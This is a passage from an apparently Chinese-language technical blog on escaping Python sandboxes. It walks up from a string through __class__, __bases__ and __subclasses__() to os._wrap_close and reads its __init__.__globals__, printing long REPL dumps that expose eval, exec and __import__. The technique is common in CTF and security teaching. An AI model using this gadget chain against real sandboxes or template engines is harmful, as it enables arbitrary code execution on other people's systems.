class="string">&#x27;itertools._tee_dataobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reprlib.Repr&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._tuplegetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections._Link&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_cache_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partialmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.singledispatchmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.ContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._GeneratorContextManagerBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._BaseExitStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enum.auto&#x27;</span>&gt;, &lt;enum <span class="string">&#x27;Enum&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re.Pattern&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re.Match&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;sre_parse.State&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;sre_parse.SubPattern&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;sre_parse.Tokenizer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re.Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._Final&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._Immutable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.Generic&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._TypingEmpty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._TypingEllipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.Annotated&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.NamedTuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.TypedDict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.io&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.re&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.Finder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.Loader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.ResourceReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;rlcompleter.Completer&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure><p>找到需要使用的类，其中有可以使用的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;,&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>调用他们</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>]  <span class="comment"># 是在上面列表中的第134个值,由于是数组所以填133</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>然后查看里面有什么可以利用的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__</span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="string">&quot;OS routines for NT or Posix depending on what system we&#x27;re on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either &#x27;posix&#x27; or &#x27;nt&#x27;\n  - os.curdir is a string representing the current directory (always &#x27;.&#x27;)\n  - os.pardir is a string representing the parent directory (always &#x27;..&#x27;)\n  - os.sep is the (or a most common) pathname separator (&#x27;/&#x27; or &#x27;\\\\&#x27;)\n  - os.extsep is the extension separator (always &#x27;.&#x27;)\n  - os.altsep is the alternate pathname separator (None or &#x27;/&#x27;)\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files (&#x27;\\r&#x27; or &#x27;\\n&#x27; or &#x27;\\r\\n&#x27;)\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device (&#x27;/dev/null&#x27;, etc.)\n\nPrograms that import and use &#x27;os&#x27; stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir), and leave all pathname manipulation to os.path\n(e.g., split and join).\n&quot;</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x7fc7ef53bbb0</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;os&#x27;</span>, loader=&lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x7fc7ef53bbb0</span>&gt;, origin=<span class="string">&#x27;/usr/lib/python3.9/os.py&#x27;</span>), <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;/usr/lib/python3.9/os.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: <span class="string">&#x27;/usr/lib/python3.9/__pycache__/os.cpython-39.pyc&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>: &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="string">&quot;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#x27; object; Ellipsis represents `...&#x27; in slices.&quot;</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;builtins&#x27;</span>, loader=&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, origin=<span class="string">&#x27;built-in&#x27;</span>), <span class="string">&#x27;__build_class__&#x27;</span>: &lt;built-<span class="keyword">in</span> function __build_class__&gt;, <span class="string">&#x27;__import__&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;, <span class="string">&#x27;abs&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;, <span class="string">&#x27;all&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">all</span>&gt;, <span class="string">&#x27;any&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">any</span>&gt;, <span class="string">&#x27;ascii&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ascii</span>&gt;, <span class="string">&#x27;bin&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">bin</span>&gt;, <span class="string">&#x27;breakpoint&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">breakpoint</span>&gt;, <span class="string">&#x27;callable&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">callable</span>&gt;, <span class="string">&#x27;chr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">chr</span>&gt;, <span class="string">&#x27;compile&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">compile</span>&gt;, <span class="string">&#x27;delattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">delattr</span>&gt;, <span class="string">&#x27;dir&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">dir</span>&gt;, <span class="string">&#x27;divmod&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">divmod</span>&gt;, <span class="string">&#x27;eval&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;, <span class="string">&#x27;exec&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">exec</span>&gt;, <span class="string">&#x27;format&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">format</span>&gt;, <span class="string">&#x27;getattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">getattr</span>&gt;, <span class="string">&#x27;globals&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">globals</span>&gt;, <span class="string">&#x27;hasattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hasattr</span>&gt;, <span class="string">&#x27;hash&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hash</span>&gt;, <span class="string">&#x27;hex&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hex</span>&gt;, <span class="string">&#x27;id&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">id</span>&gt;, <span class="string">&#x27;input&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">input</span>&gt;, <span class="string">&#x27;isinstance&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">isinstance</span>&gt;, <span class="string">&#x27;issubclass&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">issubclass</span>&gt;, <span class="string">&#x27;iter&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">iter</span>&gt;, <span class="string">&#x27;len&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">len</span>&gt;, <span class="string">&#x27;locals&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">locals</span>&gt;, <span class="string">&#x27;max&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">max</span>&gt;, <span class="string">&#x27;min&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">min</span>&gt;, <span class="string">&#x27;next&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">next</span>&gt;, <span class="string">&#x27;oct&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">oct</span>&gt;, <span class="string">&#x27;ord&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ord</span>&gt;, <span class="string">&#x27;pow&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">pow</span>&gt;, <span class="string">&#x27;print&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">print</span>&gt;, <span class="string">&#x27;repr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">repr</span>&gt;, <span class="string">&#x27;round&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">round</span>&gt;, <span class="string">&#x27;setattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">setattr</span>&gt;, <span class="string">&#x27;sorted&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">sorted</span>&gt;, <span class="string">&#x27;sum&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">sum</span>&gt;, <span class="string">&#x27;vars&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">vars</span>&gt;, <span class="string">&#x27;None&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;Ellipsis&#x27;</span>: <span class="literal">Ellipsis</span>, <span class="string">&#x27;NotImplemented&#x27;</span>: <span class="literal">NotImplemented</span>, <span class="string">&#x27;False&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;True&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;bool&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;, <span class="string">&#x27;memoryview&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, <span class="string">&#x27;bytearray&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, <span class="string">&#x27;bytes&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, <span class="string">&#x27;classmethod&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, <span class="string">&#x27;complex&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, <span class="string">&#x27;dict&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, <span class="string">&#x27;enumerate&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, <span class="string">&#x27;filter&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, <span class="string">&#x27;float&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, <span class="string">&#x27;frozenset&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, <span class="string">&#x27;property&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, <span class="string">&#x27;int&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, <span class="string">&#x27;list&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, <span class="string">&#x27;map&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, <span class="string">&#x27;object&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;, <span class="string">&#x27;range&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, <span class="string">&#x27;reversed&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, <span class="string">&#x27;set&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, <span class="string">&#x27;slice&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, <span class="string">&#x27;staticmethod&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, <span class="string">&#x27;str&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, <span class="string">&#x27;super&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, <span class="string">&#x27;tuple&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, <span class="string">&#x27;type&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, <span class="string">&#x27;zip&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;, <span class="string">&#x27;__debug__&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;BaseException&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, <span class="string">&#x27;Exception&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;Exception&#x27;</span>&gt;, <span class="string">&#x27;TypeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;TypeError&#x27;</span>&gt;, <span class="string">&#x27;StopAsyncIteration&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;StopAsyncIteration&#x27;</span>&gt;, <span class="string">&#x27;StopIteration&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;StopIteration&#x27;</span>&gt;, <span class="string">&#x27;GeneratorExit&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;GeneratorExit&#x27;</span>&gt;, <span class="string">&#x27;SystemExit&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SystemExit&#x27;</span>&gt;, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;KeyboardInterrupt&#x27;</span>&gt;, <span class="string">&#x27;ImportError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ImportError&#x27;</span>&gt;, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ModuleNotFoundError&#x27;</span>&gt;, <span class="string">&#x27;OSError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;EnvironmentError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;IOError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;EOFError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;EOFError&#x27;</span>&gt;, <span class="string">&#x27;RuntimeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;RuntimeError&#x27;</span>&gt;, <span class="string">&#x27;RecursionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;RecursionError&#x27;</span>&gt;, <span class="string">&#x27;NotImplementedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedError&#x27;</span>&gt;, <span class="string">&#x27;NameError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;NameError&#x27;</span>&gt;, <span class="string">&#x27;UnboundLocalError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnboundLocalError&#x27;</span>&gt;, <span class="string">&#x27;AttributeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;AttributeError&#x27;</span>&gt;, <span class="string">&#x27;SyntaxError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SyntaxError&#x27;</span>&gt;, <span class="string">&#x27;IndentationError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;IndentationError&#x27;</span>&gt;, <span class="string">&#x27;TabError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;TabError&#x27;</span>&gt;, <span class="string">&#x27;LookupError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;LookupError&#x27;</span>&gt;, <span class="string">&#x27;IndexError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;IndexError&#x27;</span>&gt;, <span class="string">&#x27;KeyError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;KeyError&#x27;</span>&gt;, <span class="string">&#x27;ValueError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ValueError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeEncodeError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeDecodeError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeTranslateError&#x27;</span>&gt;, <span class="string">&#x27;AssertionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;AssertionError&#x27;</span>&gt;, <span class="string">&#x27;ArithmeticError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ArithmeticError&#x27;</span>&gt;, <span class="string">&#x27;FloatingPointError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FloatingPointError&#x27;</span>&gt;, <span class="string">&#x27;OverflowError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OverflowError&#x27;</span>&gt;, <span class="string">&#x27;ZeroDivisionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ZeroDivisionError&#x27;</span>&gt;, <span class="string">&#x27;SystemError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SystemError&#x27;</span>&gt;, <span class="string">&#x27;ReferenceError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ReferenceError&#x27;</span>&gt;, <span class="string">&#x27;MemoryError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;MemoryError&#x27;</span>&gt;, <span class="string">&#x27;BufferError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BufferError&#x27;</span>&gt;, <span class="string">&#x27;Warning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;Warning&#x27;</span>&gt;, <span class="string">&#x27;UserWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UserWarning&#x27;</span>&gt;, <span class="string">&#x27;DeprecationWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;DeprecationWarning&#x27;</span>&gt;, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>&gt;, <span class="string">&#x27;SyntaxWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SyntaxWarning&#x27;</span>&gt;, <span class="string">&#x27;RuntimeWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;RuntimeWarning&#x27;</span>&gt;, <span class="string">&#x27;FutureWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FutureWarning&#x27;</span>&gt;, <span class="string">&#x27;ImportWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ImportWarning&#x27;</span>&gt;, <span class="string">&#x27;UnicodeWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeWarning&#x27;</span>&gt;, <span class="string">&#x27;BytesWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BytesWarning&#x27;</span>&gt;, <span class="string">&#x27;ResourceWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ResourceWarning&#x27;</span>&gt;, <span class="string">&#x27;ConnectionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionError&#x27;</span>&gt;, <span class="string">&#x27;BlockingIOError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BlockingIOError&#x27;</span>&gt;, <span class="string">&#x27;BrokenPipeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BrokenPipeError&#x27;</span>&gt;, <span class="string">&#x27;ChildProcessError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ChildProcessError&#x27;</span>&gt;, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionAbortedError&#x27;</span>&gt;, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionRefusedError&#x27;</span>&gt;, <span class="string">&#x27;ConnectionResetError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionResetError&#x27;</span>&gt;, <span class="string">&#x27;FileExistsError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FileExistsError&#x27;</span>&gt;, <span class="string">&#x27;FileNotFoundError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FileNotFoundError&#x27;</span>&gt;, <span class="string">&#x27;IsADirectoryError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;IsADirectoryError&#x27;</span>&gt;, <span class="string">&#x27;NotADirectoryError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;NotADirectoryError&#x27;</span>&gt;, <span class="string">&#x27;InterruptedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;InterruptedError&#x27;</span>&gt;, <span class="string">&#x27;PermissionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;PermissionError&#x27;</span>&gt;, <span class="string">&#x27;ProcessLookupError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ProcessLookupError&#x27;</span>&gt;, <span class="string">&#x27;TimeoutError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;TimeoutError&#x27;</span>&gt;, <span class="string">&#x27;open&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, <span class="string">&#x27;quit&#x27;</span>: Use quit() <span class="keyword">or</span> Ctrl-D (i.e. EOF) to exit, <span class="string">&#x27;exit&#x27;</span>: Use exit() <span class="keyword">or</span> Ctrl-D (i.e. EOF) to exit, <span class="string">&#x27;copyright&#x27;</span>: Copyright (c) <span class="number">2001</span>-<span class="number">2022</span> Python Software Foundation.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span> BeOpen.com.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">1995</span>-<span class="number">2001</span> Corporation <span class="keyword">for</span> National Research Initiatives.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">1991</span>-<span class="number">1995</span> Stichting Mathematisch Centrum, Amsterdam.</span><br><span class="line">All Rights Reserved., <span class="string">&#x27;credits&#x27;</span>:     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation <span class="keyword">and</span> a cast of thousands</span><br><span class="line">    <span class="keyword">for</span> supporting Python development.  See www.python.org <span class="keyword">for</span> more information., <span class="string">&#x27;license&#x27;</span>: <span class="type">Type</span> license() to see the full license text, <span class="string">&#x27;help&#x27;</span>: <span class="type">Type</span> <span class="built_in">help</span>() <span class="keyword">for</span> interactive <span class="built_in">help</span>, <span class="keyword">or</span> <span class="built_in">help</span>(<span class="built_in">object</span>) <span class="keyword">for</span> <span class="built_in">help</span> about <span class="built_in">object</span>., <span class="string">&#x27;_&#x27;</span>: <span class="literal">None</span>&#125;, <span class="string">&#x27;abc&#x27;</span>: &lt;module <span class="string">&#x27;abc&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python3.9/abc.py&#x27;</span>&gt;, <span class="string">&#x27;sys&#x27;</span>: &lt;module <span class="string">&#x27;sys&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;st&#x27;</span>: &lt;module <span class="string">&#x27;stat&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python3.9/stat.py&#x27;</span>&gt;, <span class="string">&#x27;_check_methods&#x27;</span>: &lt;function _check_methods at <span class="number">0x7fc7ef547a60</span>&gt;, <span class="string">&#x27;GenericAlias&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;types.GenericAlias&#x27;</span>&gt;, <span class="string">&#x27;__all__&#x27;</span>: [<span class="string">&#x27;altsep&#x27;</span>, <span class="string">&#x27;curdir&#x27;</span>, <span class="string">&#x27;pardir&#x27;</span>, <span class="string">&#x27;sep&#x27;</span>, <span class="string">&#x27;pathsep&#x27;</span>, <span class="string">&#x27;linesep&#x27;</span>, <span 